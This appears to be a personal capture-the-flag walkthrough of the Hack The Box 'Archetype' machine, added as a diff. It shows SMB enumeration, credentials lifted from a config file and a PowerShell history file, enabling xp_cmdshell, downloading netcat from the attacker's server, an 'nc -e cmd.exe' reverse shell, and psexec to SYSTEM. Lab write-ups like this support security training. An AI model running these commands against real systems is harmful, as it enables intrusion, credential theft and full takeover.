@@ -1,0 +1,180 @@
+============================================================================================================================================================
+ARCHETYPE                                                  SMB                        Microsoft SQL
+============================================================================================================================================================
+
+┌──(root㉿kali)-[~]
+└─# nmap 10.129.70.177 -sC -sV 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-13 07:42 EDT
+Nmap scan report for 10.129.70.177
+Host is up (0.074s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: ARCHETYPE
+|   NetBIOS_Domain_Name: ARCHETYPE
+|   NetBIOS_Computer_Name: ARCHETYPE
+|   DNS_Domain_Name: Archetype
+|   DNS_Computer_Name: Archetype
+|_  Product_Version: 10.0.17763
+|_ssl-date: 2022-03-13T11:54:25+00:00; +11m45s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2022-03-13T11:53:30
+|_Not valid after:  2052-03-13T11:53:30
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-03-13T11:54:18
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
+|   Computer name: Archetype
+|   NetBIOS computer name: ARCHETYPE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2022-03-13T04:54:16-07:00
+| ms-sql-info: 
+|   10.129.70.177:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+
+
+┌──(root㉿kali)-[~]
+└─# smbclient -L \\10.129.70.177      //////            smbclient -N -L 10.10.10.10 # -N : no ask for password, -L: List of shares      
+Enter WORKGROUP\root's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backups         Disk      
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.70.177 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                             
+┌──(root㉿kali)-[~]
+└─# smbclient \\\\10.129.70.177\\backups
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Jan 20 07:20:57 2020
+  ..                                  D        0  Mon Jan 20 07:20:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
+
+                5056511 blocks of size 4096. 2610868 blocks available
+
+smb: \> more prod.dtsConfig  ## open file in vi
+
+
+smb: \> get prod.dtsConfig   ## download file
+
+┌──(root㉿kali)-[~]
+└─# cat prod.dtsConfig 
+<DTSConfiguration>
+    <DTSConfigurationHeading>
+        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
+    </DTSConfigurationHeading>
+    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
+        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+    </Configuration>
+</DTSConfiguration>  
+
+
+┌──(root㉿kali)-[~]
+└─# /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.129.113.145 -windows-auth
+SQL> SELECT is_srvrolemember('sysadmin');  #####current role check 
+True
+///////// standard cheat-sheet 
+SQL> EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
+SQL> EXEC sp_configure 'show advanced options', 1; — priv
+SQL> RECONFIGURE; — priv
+SQL> EXEC sp_configure 'xp_cmdshell', 1; — priv
+SQL> RECONFIGURE; — priv
+/////////
+
+SQL> EXEC sp_configure 'show advanced options', 1;
+SQL> RECONFIGURE;
+SQL> sp_configure; - Enabling the sp_configure as stated in the above error message
+SQL> EXEC sp_configure 'xp_cmdshell', 1;
+SQL> RECONFIGURE;
+SQL> xp_cmdshell "whoami"
+archetype\sql_svc  
+
+
+gedit :
+
+https://blog.shehansanjula.me/archetype-walkthrough-htb/ # one liner ps1
+
+> revsh.ps1
+
+# different tab...
+┌──(root㉿kali)-[~/Downloads]
+└─# python3 -m http.server 80
+
+┌──(root㉿kali)-[~]
+└─# nc -lvlp 443
+listening on [any] 443 ...
+
+SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.15/nc64.exe -outfile nc64.exe"
+SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.15 443" 
+
+shell:> cd .. > cd Desktop
+C:\Users\sql_svc\Desktop>type user.txt
+type user.txt
+
+3e7b102e78218e935bf3f4951fec21a3
+
+=============================================================================================
+Privilege Escalation
+=============================================================================================
+C:\Users\sql_svc\Desktop>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+
+C:\Users\sql_svc\Desktop>
+
+┌──(root㉿kali)-[~]
+└─# python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.129.113.145
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+b91ccec3305e98240082d4474b848528
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
